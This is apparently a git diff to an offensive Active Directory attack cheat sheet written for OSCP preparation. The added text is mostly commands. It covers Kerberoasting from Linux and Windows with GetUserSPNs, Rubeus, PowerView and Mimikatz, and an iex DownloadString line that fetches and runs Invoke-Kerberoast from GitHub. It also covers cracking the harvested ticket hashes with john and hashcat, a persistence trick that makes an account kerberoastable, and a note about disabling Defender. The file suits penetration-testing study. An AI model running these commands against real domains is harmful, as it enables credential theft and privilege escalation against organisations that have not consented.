@@ -20,11 +20,17 @@ Modeled after GTFOBINs and LOLBAS but for attacking active directory.
 
 [Attacking Active Directory](#attacking-ad)
 
-- [Kerberoasting](#kerberoasting)
+- [Kerberoasting(users)](#kerberoasting)
 
-- [Local Privilege Escalation](#local-priv-esc)
+- [Leftover tickets(users)](#current-session-tickets)
 
-- [Pass The Hash](#)
+- [Local Privilege Escalation(users)](#local-priv-esc)
+
+- [Cached Credential Extraction(admins)](#cached-creds)
+
+- [Pass The Hash/Key](#passing-hashes-and-keys)
+
+- [10 attacks you need to know for oscp](#top-10)
 
 
 
@@ -519,6 +525,77 @@ proxychains bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -
 
 ## Kerberoasting
 
+*The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.*
+*You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.*
+
+**You need valid credentials inside the domain.**
+
+### Kerberoast From Linux
+
+```bash
+msf> use auxiliary/gather/get_user_spns
+
+GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
+
+GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
+```
+
+### Kerberoast From Windows
+
+From memory to disk
+```ps
+Get-NetUser -SPN | select serviceprincipalname #PowerView, get user service accounts
+
+#Get TGS in memory
+Add-Type -AssemblyName System.IdentityModel 
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
+ 
+klist #List kerberos tickets in memory
+ 
+Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
+```
+
+On-Disk (more visible)
+```cmd
+# Powerview
+Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
+
+# Rubeus
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
+
+# Invoke-Kerberoast
+iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+```
+### Kerberoast Cracking
+
+```bash
+john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+```
+
+### Kerberoasting Persistence
+
+If you have enough permissions over a user you can make it kerberoastable:
+
+```ps
+ Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
+```
+
+Tool for kerberoast
+https://github.com/nidem/kerberoast
+
+### Issues kerberoasting 
+
+If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: 
+
+```bash
+ntpdate <IP of DC>
+```
+
 ## Local Priv Esc
 
 Use a guide like the one here or on [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) and use something like [Hacktricks-Windows-privesc Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
@@ -539,9 +616,9 @@ It's very unlikely that you will find tickets in the current user giving you per
 
 If you are already administrator on a domain connected machine you can dump local hashes and try and crack them, or pivot with pass or overpass the hash.
 
-This can be done with fgdump on older machines and mimikatz on most new machines. (Note may have to turn defender off)
+This can be done with **fgdump** on older machines and **mimikatz** on most new machines. (Note may have to turn defender off)
 
-## Mimi cheatsheat
+#### Mimi cheatsheat
 
 ```ps
 #general
@@ -610,7 +687,7 @@ kerberos::tgt
 #purge
 kerberos::purge
 ```
-## fgdump Cheatsheat:
+#### fgdump Cheatsheat:
 
 ```cmd
 # Dumping a Local Machine Using the Current User
@@ -740,12 +817,12 @@ This kind of attack is similar to Pass the Key, but instead of using hashes to r
 notes from https://www.youtube.com/watch?v=xowytiyooBk (great youtube vid)
 
 
-
+# Top 10
+[back to top](#index)
 
 
 Ten attacks you should master for the OSCP:
 
-[back to top](#index)
 
 10. ReadGMSAPassword 
 Description: ReadGMSAPassword allows an attacker to use the password of a Group Managed Service Account which usually has elevated privileges. 
